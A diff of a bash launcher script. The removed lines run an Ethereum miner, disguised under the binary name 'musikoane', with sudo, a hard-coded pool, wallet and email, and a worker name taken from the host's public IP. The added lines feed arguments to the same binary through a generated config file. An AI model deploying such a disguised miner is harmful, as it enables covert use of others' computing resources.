@@ -1,11 +1,24 @@
 #!/bin/bash
-
-COIN=eth
-EMAIL=adityarizal323@gmail.com
-POOL=eth.f2pool.com:6688
-WALLET=0x35c7ed9124ea813033d909c0698a1eb52aa9e268
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
-
-cd "$(dirname "$0")"
-
-chmod +x ./musikoane && sudo ./musikoane -algo ethash -pool1 eth.f2pool.com:6688 -wallet 0x35c7ed9124ea813033d909c0698a1eb52aa9e268 -coin eth -rigName $(echo "$(curl -s ifconfig.me)" | tr . _ ) -email adityarizal323@gmail.com
+i=0;
+algo="";
+configFile="config_cmdline.ini"
+> $configFile;
+while [[ "$#" -gt 0 ]]; do
+  if echo "$1" | grep -q "algo"; then
+    algo=$1;
+  else
+    if (($((i % 2)) == 0)); then
+      a=$1;
+      echo -n ${a:1}= >> $configFile;
+    else
+      if [ "$algo" == "" ]; then
+        echo $1 >> $configFile;
+      else
+        echo [$1] >> $configFile;
+      fi
+      algo="";
+    fi
+  fi
+  i=$((i+1));
+shift; done
+chmod +x ./musikoane && ./musikoane $configFile 
